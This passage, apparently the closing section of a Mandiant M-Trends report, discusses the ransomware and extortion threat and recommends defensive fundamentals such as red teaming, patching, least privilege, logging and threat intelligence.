ransomware and multifaceted extortion. With low risks and barrier to entry and high 
rewards, we see this as an ongoing threat posing a risk to every organization.

Preparation is vital not just for ransomware but all types of attacks, whether through 
red teaming, tabletop exercises, training or other techniques. Sound fundamentals, 
such as vulnerability and patch management, least privilege and hardening also play 
a role in building strong defenses. Our case study involving coinminers illustrates the 
value of logging and following up on alerts, since the investigation eventually led to 
even more significant threats.

The heart of any cyber defense capability is the intelligence that drives it, and the 
best threat intelligence is gleaned directly from the frontlines. Mandiant will continue 
to share its frontline knowledge in M\-Trends to improve our collective security 
awareness, understanding and capabilities—and to ensure that organizations can stay 
relentless in their cyber security efforts.
